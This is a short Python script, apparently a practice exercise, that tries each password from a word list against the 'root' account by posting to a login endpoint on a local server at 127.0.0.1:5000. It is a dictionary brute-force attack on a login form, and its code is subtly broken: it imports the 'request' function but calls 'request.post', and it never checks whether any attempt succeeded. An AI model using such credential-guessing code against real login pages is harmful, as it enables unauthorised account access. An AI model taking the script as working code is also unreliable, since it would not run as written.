from requests import request

url = "http://127.0.0.1:5000/login"

def engine(word_list: list):
    for password in word_list:
        payload = {
            "username": "root",
            "password": password

        }
        request.post(url, data=payload)

    return None